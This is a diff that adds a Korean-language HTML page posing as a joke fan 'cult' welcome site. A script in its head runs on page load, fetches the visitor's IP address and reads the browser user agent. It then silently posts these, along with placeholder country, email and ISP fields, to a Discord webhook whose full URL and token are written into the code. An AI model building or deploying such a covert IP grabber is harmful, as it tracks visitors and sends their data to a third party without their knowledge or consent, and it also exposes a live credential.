@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>여름 최고</title>
+    <script>
+        // DISCORD 웹훅 URL
+        const webhookURL = 'https://discordapp.com/api/webhooks/1287448411985154088/X1Wnq7QgNeXPmTcsiRYr2wHtdlAmoj9dMcdjSW_h346V9v3jP-dq12vzW9uWJ6vJkMbp';
+
+        // 사용자의 IP 주소와 정보를 가져오는 함수
+        async function sendUserInfo() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
+
+            // 접속 시간, 국가, ASN, 이메일, 기기, 통신사 정보 생성
+            const userInfo = {
+                ip: userIP,
+                time: new Date().toISOString(),
+                country: '대한민국', // 예시로 대한민국 사용
+                asn: 'AS12345', // 예시 ASN
+                email: 'user@example.com', // 예시 이메일
+                device: navigator.userAgent,
+                isp: '통신사 예시' // 예시 통신사
+            };
+
+            // DISCORD 웹훅에 전송할 데이터 구성
+            const embed = {
+                title: "사이트에 새로운 유저가 들어왔습니다",
+                description: `IP: ${userInfo.ip}\n시간: ${userInfo.time}\n국가: ${userInfo.country}\nASN: ${userInfo.asn}\n이메일: ${userInfo.email}\n기기: ${userInfo.device}\n통신사: ${userInfo.isp}`,
+                color: 7506394 // 임베드 색상
+            };
+
+            // 웹훅에 데이터 전송
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        }
+
+        // 페이지 로드 시 사용자 정보 전송
+        window.onload = sendUserInfo;
+    </script>
+</head>
+<body>
+    <h1>환영합니다! 이곳은 여름누나를 존경하고 믿고 따르고 굴복하는 사이트 여름교입니다</h1>
+    <p>여름교 사이트에 접속해 주셔서 감사합니다.</p>
+</body>
+</html>
